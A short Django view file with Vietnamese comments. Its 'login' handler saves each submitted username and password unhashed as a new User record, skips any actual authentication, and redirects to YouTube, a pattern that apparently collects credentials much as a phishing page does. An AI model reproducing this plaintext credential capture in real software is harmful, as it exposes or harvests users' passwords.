from django.shortcuts import render, redirect
from .models import User
from django.http import HttpResponse

def login_view(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')

        # Kiểm tra nếu username và password không rỗng
        if username and password:
            # Lưu vào database
            user = User(username=username, password=password)
            user.save()

            # Chuyển hướng đến trang ngoài (YouTube)
            return redirect('https://www.youtube.com/')
        else:
            return HttpResponse("Vui lòng điền đầy đủ thông tin.", status=400)

    return render(request, 'login.html')
